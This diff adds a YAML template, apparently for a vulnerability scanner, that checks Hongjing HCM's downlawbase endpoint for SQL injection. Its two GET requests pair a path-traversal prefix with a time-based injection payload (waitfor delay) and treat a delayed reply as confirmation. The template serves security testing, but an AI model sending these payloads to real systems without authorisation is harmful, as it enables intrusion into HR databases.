@@ -1,0 +1,17 @@
+name: 宏景HCM-downlawbase-SQL注入
+description: >-
+  SQL注入
+alwaysExecute: false
+timeout: 6
+matchCount: 2
+rules:
+  - method: GET
+    path: /templates/attestation/../../selfservice/lawbase/downlawbase?id=11';waitfor+delay+'0:0:5'--+
+    expression:
+      status: 200
+      sleep: 5
+  - method: GET
+    path: /templates/attestation/../../selfservice/lawbase/downlawbase?id=11';waitfor+delay+'0:0:3'--+
+    expression:
+      status: 200
+      sleep: 3
